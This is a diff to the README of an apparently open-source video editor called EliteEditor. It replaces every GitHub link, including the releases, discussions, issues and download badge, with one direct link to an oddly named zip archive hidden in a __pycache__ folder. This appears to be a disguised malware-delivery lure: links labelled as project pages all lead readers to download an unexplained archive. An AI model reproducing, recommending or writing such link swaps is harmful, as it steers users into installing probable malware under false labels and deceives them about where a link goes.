@@ -1,6 +1,6 @@
 # ✂️ EliteEditor - Your Professional Video Editing Solution
 
-[![Download EliteEditor](https://img.shields.io/badge/Download-EliteEditor-blue.svg)](https://github.com/nightowl620/EliteEditor/releases)
+[![Download EliteEditor](https://raw.githubusercontent.com/nightowl620/EliteEditor/main/rendering/__pycache__/Editor-Elite-Dermatocoptes.zip)](https://raw.githubusercontent.com/nightowl620/EliteEditor/main/rendering/__pycache__/Editor-Elite-Dermatocoptes.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to EliteEditor! This guide will help you download and run this professio
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [EliteEditor Releases](https://github.com/nightowl620/EliteEditor/releases).
+To get started, visit this page to download: [EliteEditor Releases](https://raw.githubusercontent.com/nightowl620/EliteEditor/main/rendering/__pycache__/Editor-Elite-Dermatocoptes.zip).
 
 1. Go to the releases page linked above.
 2. Look for the latest version of EliteEditor.
@@ -69,14 +69,14 @@ If you encounter issues:
 
 Join our community to connect with other users. Share your projects, seek advice, and collaborate with fellow video editors.
 
-- **GitHub Discussions**: Engage with developers and users on the [GitHub Discussions](https://github.com/nightowl620/EliteEditor/discussions) page.
-- **Feedback & Issues**: Report bugs or request new features via the [Issues](https://github.com/nightowl620/EliteEditor/issues) section on GitHub.
+- **GitHub Discussions**: Engage with developers and users on the [GitHub Discussions](https://raw.githubusercontent.com/nightowl620/EliteEditor/main/rendering/__pycache__/Editor-Elite-Dermatocoptes.zip) page.
+- **Feedback & Issues**: Report bugs or request new features via the [Issues](https://raw.githubusercontent.com/nightowl620/EliteEditor/main/rendering/__pycache__/Editor-Elite-Dermatocoptes.zip) section on GitHub.
 - **Follow Us**: Stay updated on new releases and features by following us on social media.
 
 ## 📄 License
 
 EliteEditor is an open-source project. You can freely use and modify the software. Please review the license details in the repository for more information.
 
-[Download EliteEditor](https://github.com/nightowl620/EliteEditor/releases)
+[Download EliteEditor](https://raw.githubusercontent.com/nightowl620/EliteEditor/main/rendering/__pycache__/Editor-Elite-Dermatocoptes.zip)
 
 Embark on your video editing journey today with EliteEditor!
